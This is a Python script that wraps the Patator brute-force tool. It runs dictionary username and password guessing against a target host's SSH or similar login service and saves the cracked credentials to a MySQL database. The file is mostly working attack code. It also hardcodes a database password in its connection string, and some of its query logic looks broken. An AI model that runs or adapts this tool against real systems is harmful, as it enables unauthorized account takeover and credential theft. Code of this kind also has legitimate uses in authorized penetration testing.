__author__ = 'dare7'
import sys
import os
from subprocess import Popen, PIPE
from sqlalchemy import create_engine
from sqlalchemy import Column, ForeignKey, Integer, String, TIMESTAMP, func
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
from sqlalchemy import and_
import csv
import shutil

base = declarative_base()

class ResultBrute(base):
    __tablename__ = 'result_brute'
    # ORM definition for patator results
    id = Column(Integer, primary_key=True)
    ip = Column(String(255), nullable=False)
    service = Column(String(255), nullable=False)
    username = Column(String(255), nullable=False)
    password = Column(String(255), nullable=False)
    details = Column(String(255), nullable=False)
    last_time = Column(TIMESTAMP, server_default=func.now(), onupdate=func.current_timestamp())


class ResultPatator():
    def __init__(self):
        self.ip = ""
        self.service = ""
        self.username = ""
        self.password = ""
        self.details = ""

    def __str__(self):
        return self.ip + " " + self.service + " " + self.username + " " + self.password + " " + self.details

    def setter(self, ip, service, username, password, details):
        self.ip = ip
        self.service = service
        self.username = username
        self.password = password
        self.details = details

    def getter(self):
        return self.ip, self.service, self.username, self.password, self.details

class Patator():
    """
    Patator wrapper main class
    """
    def __init__(self):
        self.work_dir = os.path.dirname(os.path.realpath(__file__))
        self.export_dir = os.path.join(self.work_dir, "import")
        self.out_dir = os.path.join(self.work_dir, "bruted_out")
        self.master_dir = os.path.join(self.export_dir, "patator-master")
        self.patator = os.path.join(self.master_dir, "patator.py")
        self.dict_dir = os.path.join(self.master_dir, "dict")
        self.dict_users = os.path.join(self.dict_dir, "u.txt")
        self.dict_pass = os.path.join(self.dict_dir, "p.txt")
        self.out_file = os.path.join(self.out_dir, "RESULTS.csv")
        self.temp_dir = os.path.join(self.work_dir,"temp")
        self.db_string = "mysql://python:12Zaqws!@127.0.0.1/tokio"  # for prod change
        self.target = "ssh_login"
        self.mode = "127.0.0.1"
        self.result = []
        self.bruted_list = []

    def launch(self, mode, target):
        """
        Launch Patator brutforce utility wrapper via python2.7
        :param mode: standard patator modes: ssh_login, ftp_login, etc
        :param target: an ip of target host
        :return: output fileof brutforce attempts
        """
        self.mode = mode
        self.target = target
        if "win" in sys.platform:
            python2 = sys.executable.replace("34", "27")
        else:
            python2 = sys.executable.replace("3.4", "2.7")

        shutil.rmtree(os.path.join(self.temp_dir,"bruted_out"))
        shutil.move(self.out_dir, os.path.join(self.work_dir,"temp"))
        args = "host=" + target + " user=FILE0 password=FILE1 0=" + self.dict_users + " 1=" + self.dict_pass + " -l bruted_out"
        cmd = python2 + " " + self.patator + " " + mode + " " + args
        proc = Popen(cmd, stdout=PIPE).communicate()[0]
        self.parse_results()
        self.write_results()
        return self.bruted_list

    def parse_results(self):
        """
        Parser for patator csv output
        :return: parsed list of bruteforced accounts as ResultPatator object
        """

        with open(self.out_file, 'r') as f:
            reader = csv.reader(f)
            result_list = list(reader)
        for element in result_list[1:]:
            if "Authentication failed." not in element:
                self.result.append(element)
        for lists in self.result:
            bruted = ResultPatator()
            #setter(self, ip, service, username, password, details)
            bruted.setter(self.target, self.mode, lists[5].split(":")[0], lists[5].split(":")[1], lists[7])
            self.bruted_list.append(bruted)
        return self.bruted_list

    def write_results(self):
        """
        Write brutforce results to DB via ORM
        :return: alchemy query for all rows in result table
        """
        engine = create_engine(self.db_string, echo=True)
        base.metadata.create_all(engine)
        base.metadata.bind = engine
        db_session = sessionmaker(bind=engine)
        session = db_session()
        for obj in self.bruted_list:
            if not session.query(ResultBrute).filter(and_(ResultBrute.ip == obj.ip), (ResultBrute.service == obj.service),
                    (ResultBrute.username == obj.username), (ResultBrute.password == obj.password)):
                entry = ResultBrute(ip=obj.ip, service=obj.service, username=obj.username, password=obj.password, details=obj.details)
                session.add(entry)
        #id = Column(Integer, primary_key=True)
        #ip = Column(String(255), nullable=False)
        #service = Column(String(255), nullable=False)
        #username = Column(String(255), nullable=False)
        #password = Column(String(255), nullable=False)
        #details = Column(String(255), nullable=False)
        #rows = session.query(ResultBrute).filter(and_(ResultBrute.ip == self.target), (ResultBrute.password == self.target))
        #rows.value = self.e
        session.commit()
        return session.query("ResultPatator")

if __name__ == '__main__':
    #ssh_brute()
    brute = Patator()
    brute.launch("ssh_login", "192.168.1.177")